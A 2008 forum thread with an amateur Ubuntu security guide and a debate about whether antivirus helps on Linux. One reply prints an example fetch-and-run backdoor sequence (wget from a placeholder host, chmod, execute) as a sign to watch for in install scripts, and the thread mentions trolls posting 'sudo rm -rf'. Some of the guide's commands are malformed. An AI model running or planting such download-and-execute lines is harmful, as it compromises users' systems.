---
title: "My Ubuntu Security Guide"
date: 2008-03-01
forum: Security Discussions
---

### Post by ShinHadoken on 2008-03-01
[CENTER][SIZE="6"]ShinHadoken's Ubuntu Security Guide[/SIZE][/CENTER]

.: Table of Contents :.
- Introduction & Disclaimer
- I. Changing Some Default Settings
- II. Securing Firefox
- III. Installing Security Software
- IV. Conclusion

____________

This is MY personal guide to securing Ubuntu. I borrowed from [The Big Ol' Ubuntu Security Resource]("http://www.itsecurity.com/features/ubuntu-secure-install-resource/") at itsecurity.com. The rest is from my own poking around the net. Okay! Let's begin.

_**I. Changing Some Default Settings**_

Ubuntu is a very secure operating system, but there are a few default settings we need to change in order to provide maximum security. The first is to reconfigure our shared memory. OPen up a terminal and type "sudo pico /etc/fstab", and add the following line of code:

> 
tmpfs /dev/shm tmpfs defaults,ro 0 0


____________________

Next, we'll need to keep anyone from remotely logging in as root on your pc. Type "sudo pico /etc/ssh/sshd_config" and change the following:

> 
PermitRootLogin yes

to

PermitRootLogin no


____________________

Now, we're going to change who can use our su and sudo commands. In the terminal, enter the following commands:

> 
sudo chown root:admin /bin/su sudo
chmod 04750 /bin/su


____________________

Okay, now we want Ubuntu to automatically download security updates.

[QUOTE="ITSecurity.Com"]
To enable automatic security updates, click on "System" select "Administration" and choose the "Software Sources" menu. From there select the "Internet Updates" tab and enable "Check for updates automatically" (specify "Daily"). Now every time Ubuntu issues a new security release you will be notified via the "Update Manager" icon in the system tray. From there it's up to you to click the icon and allow the Update Manager to download and install the files.[/QUOTE]

 - Thanks [ITSecurity]("http://www.itsecurity.com/features/ubuntu-secure-install-resource/")

____________________

Last but not least, we're going to secure our /home directory. In the terminal, execute the following commands:

[QUOTE="ITSecurity"]
chmod 0700 /home/username (replace username with the name you use to login to your computer)
[/QUOTE]

 - Thanks [ITSecurity]("http://www.itsecurity.com/features/ubuntu-secure-install-resource/")

_____________________

_**II. Securing Firefox**_

Firefox, the default web browser in Ubuntu, is fairly secure by itself. But a few addons can make this browser as tight as a Swedish bank account. Go to [addons.mozilla.com]("http://addons.mozilla.com/") and download the following:

[LIST]
[*] Adblock Plus - The best adblocker I've ever used, a security MUST! (go to [adblock.jonasjohn.de]("http://adblock.jonasjohn.de/") to make a custom filterset)
[*] CustomizeGoogle - Allows you to disable Google Ads and harmful software such as Goolgle-Analytics.
[*] NoScript - Disables harmful scripts from running and allows you to whitelist good sites. Another security MUST!
[*] WOT - Warns you about harmful websites. Even works in search engines!
[/LIST]

Also, at [firekeeper.mozdev.com]("http://firekeeper.mozdev.com/"), you can download Firekeeper, a browser intrusion detection app. Yet another security MUST!

____________________

The following aren't security addons, but I highly recommend going to [addons.mozilla.com]("http://addons.mozilla.com/") and downloading:

[LIST]
[*] Fasterfox - A great way to keep Firefox on its toes.
[*] Firebug - Allows you to debug web pages that have errors.
[/LIST]

____________________

_**III. Installing Security Software**_

Here are the security packages that I use on my box:

[LIST]
[*] [grsecurity]("http://www.grsecurity.net/") (Kernel protection)
[*] [Rootkit Hunter]("http://www.rootkit.nl/projects/rootkit_hunter.html") (Rootkit protection)
[*] [AVG Free for Linux]("http://free.grisoft.com/doc/downloads/us/frt/0?prd=afl") (AV protection)
[*] [Nagios]("http://www.nagios.com/") (Network monitoring)
[*] [Snort]("http://www.snort.com/") (Intrusion detection)
[*] [Thunderbird]("http://www.mozilla.org/") (Secure Email Client)
[*] [SpyBot]("http://www.spybot.com/")* (Spyware removal, requires [Wine]("http://www.winehq.org/") to run)
[*] [OpenSSH]("http://openssh.net/") (Secure remote access client)
[*] [Firestarter]("http://fs-security.com/") (Firewall, available in the Ubuntu repositories)
[/LIST]

*Yes, I'm very well aware that there's no spyware out there for Linux. However, that's what people said a few years ago about Linux virii. I want to be prepared. And if later a real Linux-based spyware remover comes out, I'll use it on my own box and adjust the guide accordingly. But for the meantime, I like SpyBot the best.

___________________

_**IV. Conclusion**_

Well, I hope this guide has helped! If you need help on installing anything, there's probably a guide for it over at [help.ubuntu.com]("http://help.ubuntu.com/"). Thanks once again to [ITSecurity]("http://www.itsecurity.com/")! 

.: ShinHadoken :.

---

### Post by ShinHadoken on 2008-03-08
Just bringing this back up to see if anyone might want to l00k at it! :)

---

### Post by p_quarles on 2008-03-09
> **ShinHadoken said:**
> [CENTER]____________________

_**III. Installing Security Software**_

Here are the security packages that I use on my box:

[LIST]
[*] [grsecurity]("http://www.grsecurity.net/") (Kernel protection)
[*] [Rootkit Hunter]("http://www.rootkit.nl/projects/rootkit_hunter.html") (Rootkit protection)
[*] [AVG Free for Linux]("http://free.grisoft.com/doc/downloads/us/frt/0?prd=afl") (AV protection)
[*] [Nagios]("http://www.nagios.com/") (Network monitoring)
[*] [Snort]("http://www.snort.com/") (Intrusion detection)
[*] [Thunderbird]("http://www.mozilla.org/") (Secure Email Client)
[*] [SpyBot]("http://www.spybot.com/")* (Spyware removal, requires [Wine]("http://www.winehq.org/") to run)
[*] [OpenSSH]("http://openssh.net/") (Secure remote access client)
[*] [Firestarter]("http://fs-security.com/") (Firewall, available in the Ubuntu repositories)
[/LIST]

*Yes, I'm very well aware that there's no spyware out there for Linux. However, that's what people said a few years ago about Linux virii. I want to be prepared. And if later a real Linux-based spyware remover comes out, I'll use it on my own box and adjust the guide accordingly. But for the meantime, I like SpyBot the best..
The rest of the advice you gave is sound, but I believe that this section is misguided. Spybot S&D and AVG cannot scan for malware that doesn't exist. The possibility that they might someday exist is no reason to use these products now. Installing them now doesn't "prepare" your computer for anything, since there are no signature files for malware which doesn't exist. It would be like going to the doctor to ask for an inoculation against a virus (the real-life kind) which hasn't come into being yet. 

As for there being Linux viruses: yes, there are, but not "in the wild." There are a several proofs of concept, and several old ones that no longer circulate. The kernel has been long since patched against these exploits. There is nothing preventing an evil genius from designing a new and deadly virus, but (again) AVG would not be able to have a signature for that virus until after the virus hit the public. Having AVG would not, therefore, prevent you from getting infected, because it wouldn't have a chance of recognizing this new virus as a virus. 

The main reason that tools like AVG and ClamAV exist is, actually, for the benefit of Windows users. Many mail- and file-servers are run on Linux OSes, and many Windows users access these servers. Running antivirus software on such servers is a good idea because it helps prevent the spread of Windows malware to Windows users. For a Linux home PC, running such a program uses resources without granting any benefit in return. 

Basically, the idea of "security software" is very much a Windows-oriented one. The underlying design of Windows is such that it has fairly serious security flaws built-in. This isn't bashing, it's just a fact that goes back to its origins as a single-user system that was built in the days before the wide usage of the internet. UNIX (and its descendents including Linux) on the other hand has always been designed to be secure in a multi-user, networked environment. Its philosophy toward security has always been very different from that of Windows. Essentially, it focuses on preventing the possibility of exploits rather than on fixing them after the fact. 

More thoughts on this can be found in [this sticky](http://ubuntuforums.org/showthread.php?t=694198).

---

### Post by Dr Small on 2008-03-09
> There is nothing preventing an evil genius from designing a new and deadly virus, but (again) AVG would not be able to have a signature for that virus until after the virus hit the public.
Thanks for the compliment. lol.
I developed a backdoor trojan all with a shell script once for testing purposes that when executed with sudo (a little social engineering here, because the script was to "install" an application) it would download and execute a second script (as root, of course) and would make the backdoor.

I won't go into too much detail, but the possibility of embedding a backdoor trojan into install script is VERY real, which can bore a hole into the users security and allow the attacker to have access to the system to do what he wants.

All the more reason to scan shell scripts beforehand, and if you see it go off to some random site to download something, you had better check it out.

Mine was a proof of concept, but it could easily be distributed into various installation shell scripts without a users notice.

Dr Small

---

### Post by p_quarles on 2008-03-09
> **Dr Small said:**
> I developed a backdoor trojan all with a shell script once for testing purposes that when executed with sudo (a little social engineering here, because the script was to "install" an application) it would download and execute a second script (as root, of course) and would make the backdoor.
Well, yes, any program that you run with root privileges can take over your system. That's not news. 

> I won't go into too much detail, but the possibility of embedding a backdoor trojan into install script is VERY real, which can bore a hole into the users security and allow the attacker to have access to the system to do what he wants.
Of course it's real, but as you said, it wouldn't work without social engineering. It isn't the case, though, that you would unthinkingly click on a *.jpg file that came in your e-mail, only to discover that this embedded a keylogger on your system. 

> All the more reason to scan shell scripts beforehand, and if you see it go off to some random site to download something, you had better check it out.
Scan the shell script for what? That was the point I was making, and which you seem to have overlooked. Anti-malware developers are unable to create a signature for a proof-of-concept trojan that exists on your hard drive. If you were to release this into the wild, no security software would have the data required in order to recognize it as malware. 

> Mine was a proof of concept, but it could easily be distributed into various installation shell scripts without a users notice.
This is why it is ill-advised to run arbitrary code unless you understand what it does, or have good reason to trust it. This is a well-known security risk, and one -- I will reiterate -- which isn't solved by checking against a malware database. 

This seems to be a common misconception, frankly. When someone says "you don't need anti-virus software for Linux," others will take this as though the person is claiming that Linux doesn't have any security risks. No, there are plenty of security risks for Linux, but none of them are viruses.

---

### Post by Dr Small on 2008-03-09
> Scan the shell script for what? 
Maybe something like:
```

wget -q http://foriegnurl.com/backdoor
chmod +x backdoor
./backdoor
```

Each to his own backdoor, but anything that looks suspicious. Af course, it could be anything, so like you said, the Anti Virus applications couldn't pick it up. But still, the user should investigate as a general rule.

Dr Small

---

### Post by aysiu on 2008-03-09
> **Dr Small said:**
> Maybe something like:
```

wget -q http://foriegnurl.com/backdoor
chmod +x backdoor
./backdoor
```

Each to his own backdoor, but anything that looks suspicious. Af course, it could be anything, so like you said, the Anti Virus applications couldn't pick it up. But still, the user should investigate as a general rule.

Dr Small
That's not relevant to the discussion here, though. The discussion is about anti-virus applications, not user investigations.

What sparked this discussion in the first place was the following statement: > *Yes, I'm very well aware that there's no spyware out there for Linux. However, that's what people said a few years ago about Linux virii. I want to be prepared. And if later a real Linux-based spyware remover comes out, I'll use it on my own box and adjust the guide accordingly. But for the meantime, I like SpyBot the best. I didn't see anything in there about "Make sure you examine shell scripts for fishy-looking commands before running them."

I think we all agree that you should look at a shell script to see before you run it if it will do anything suspicious. What we seem to disagree about here, though, is whether running anti-virus in Linux offers you any protection against future potential Linux virus threats. p_quarles and I are saying it doesn't.

---

### Post by Dr Small on 2008-03-09
Yeah, sorry for getting offtopic there. But yeah, antiviruses are ment mainly for Windows binaries to scan, not any trojans that could be popping up in Linux.

The sad thing is, say a team made it their mission to infest linux with viruses and trojans. Everyone who runs antivirus thinks they are secure from all of this. There would be no way to stop them and security would yet again be placed on the user instead of relying on an Antivirus application.

I still think that we should be educating the users more, because as ubuntu grows (or linux in general) and comes up from under the radar, there will most likely be more attacks along with viruses and trojans in applications, while AVG and such won't be able to stop it, because that is not what it was designed to protect against.

Like how the forums were flooded for awhile with the croonies posting the sudo rm -rf help... We can ban them, but if they have a burning desire to spead their maliciousness, there is no possible way to stop them. Then if Linux riseses to high standards of security and more people begin to use it, just watch and see if there are not more exploits / viruses / trojans show up from evil linux users and ex-windows virus writters.

Dr Small

---

### Post by aysiu on 2008-03-09
> **Dr Small said:**
> 
The sad thing is, say a team made it their mission to infest linux with viruses and trojans. Everyone who runs antivirus thinks they are secure from all of this. There would be no way to stop them and security would yet again be placed on the user instead of relying on an Antivirus application. That's exactly the point. Linux users who aren't running mail servers or file servers for Windows computers have a false sense of security.

The real threats to Linux security would probably involve social engineering, rather than a self-replicating virus.

---

### Post by Dr Small on 2008-03-09
Yes, it would have to involve social engineering, because it would have to involve the user running the virus / backdoor, as they would most likely never be able to sneak any thing in their application into a repository or whatnot.

---

### Post by munkyeetr on 2008-03-09
I have a few questions regarding the OP, I am by no means any expert in this, I just am having a hard time understanding some of this:

In[COLOR="Red"] part 1, section1[/COLOR] you said to add this to your /etc/fstab file
```

tmpfs /dev/shm tmpfs defaults,ro 0 0

```
What's the purpose of this exactly? First off, I don't have a /dev/shm entry, and if I did and wanted to mount it, wouldn't I use the following:
```

/dev/shm /tmpfs defaults,ro 0 0

```
omitting the preceding **tmpfs**?



In [COLOR="Red"]part 1, section2[/COLOR], my /etc/ssh/ssh_config file doesn't have an entry labeled **PermitRootLogin** at all. Is that normal? Should I add it with the **No** value?

Any explanation advice on these questions would be appreciated.

---

### Post by Dr Small on 2008-03-09
As for your second question, You are in the wrong file. You are editing your ssh config file, not your sshd one. That would be located at:
```
/etc/ssh/sshd_config
```

And, for a list of available options for the sshd_config file, please check out the man page, as it is well documented:
```
man sshd_config
```

---

### Post by munkyeetr on 2008-03-09
Thank you for pointing out that error on my behalf, Dr Small, however it doesn't end my problem. I do not have a file named sshd_config in my /etc/ssh directory, or anywhere on my filesystem for that matter, and when I check for the man page it returns "No entry for sshd_config"

Do I need to install something?

---

### Post by Dr Small on 2008-03-09
The Openssh-server package is not installed by default, so if you haven't installed it,  it would be a good idea to install if you want a ssh server ;)
```
sudo apt-get install openssh-server
```

Then you can test to make sure it is working by running:
```
ssh localhost
```

If it prompts for your password and you login, then the ssh server installed successfully and is running properly :)

Then you can configure the SSH server with the config file. Also, more information on SSH can be found at these two links from the Ubuntu Wiki:
[https://wiki.ubuntu.com/SSHHowto](https://wiki.ubuntu.com/SSHHowto)
[https://wiki.ubuntu.com/AdvancedOpenSSH](https://wiki.ubuntu.com/AdvancedOpenSSH)

Dr Small

---

### Post by munkyeetr on 2008-03-10
Thank you for that.

---

### Post by Dr Small on 2008-03-10
No problem. Glad I could help :)

---

